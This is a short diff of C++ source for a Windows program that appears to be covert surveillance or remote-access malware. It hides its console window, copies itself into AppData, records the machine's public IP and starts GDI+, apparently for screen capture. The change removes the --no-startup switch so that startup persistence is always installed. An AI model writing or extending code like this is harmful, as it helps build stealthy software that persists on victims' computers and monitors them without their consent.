@@ -1550,11 +1550,10 @@ void hideToAppData() {
 }
 
 int main(int argc, char* argv[]) {
-    bool noStartup = false, noScreen = false, showConsole = false, hide = false;
+    bool noScreen = false, showConsole = false, hide = false;
     for (int i = 1; i < argc; i++) {
         std::string a = argv[i];
-        if (a == "--no-startup") noStartup = true;
-        else if (a == "--no-ping") g_noPing = true;
+        if (a == "--no-ping") g_noPing = true;
         else if (a == "--no-screen") noScreen = true;
         else if (a == "--show") showConsole = true;
         else if (a == "--hide") hide = true;
@@ -1579,7 +1578,7 @@ int main(int argc, char* argv[]) {
     HWND hwnd = GetConsoleWindow();
     if (hwnd && !showConsole) ShowWindow(hwnd, SW_HIDE);
     publicIP = getPublicIP();
-    if (!noStartup) installStartup();
+    installStartup();
     GdiplusStartupInput gdiplusStartupInput;
     ULONG_PTR gdiplusToken;
     GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
